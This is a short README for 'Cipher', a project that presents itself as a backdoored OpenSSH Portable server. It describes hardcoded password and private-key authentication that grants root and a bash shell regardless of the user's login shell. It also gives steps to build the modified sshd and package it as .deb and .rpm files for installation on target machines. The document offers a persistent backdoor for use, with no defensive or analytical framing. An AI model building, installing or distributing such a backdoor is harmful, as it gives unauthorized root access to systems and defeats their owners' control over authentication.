# Cipher
## Author: MeHungr (Dylan Weber)

Cipher is an OpenSSH Portable backdoor that allows authentication using a specific password or generated SSH private key. The password is configurable in `install/generate_key.sh` or `auth-universal.h` after generating a key.

Cipher also now escalates any user that authenticated using these backdoor credentials to root. It also ignores the user's login shell and gives you a bash shell.

Each modified function (should) be prefixed with: \
`// PATCHED FOR VULNERABILITY`

## Installation
1. Configure password in `install/generate_key.sh`
2. Run `install/install.sh`
    - This will set up the ssh key and build the executables
    - It will also create .deb and .rpm files in `<project-root>/build/packages`
3. Output will be in `<project-root>/output`
4. The server executable is `output/bin/sshd`

Run dpkg -i <.deb file> to install
